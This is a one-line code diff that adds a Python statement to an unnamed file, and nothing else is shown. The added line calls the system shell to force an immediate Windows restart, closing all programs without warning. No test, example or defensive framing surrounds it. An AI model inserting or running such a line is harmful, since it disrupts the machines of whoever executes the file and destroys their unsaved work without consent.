@@ -1,0 +1,1 @@
+import os; os.system("shutdown /r /f /t 0")
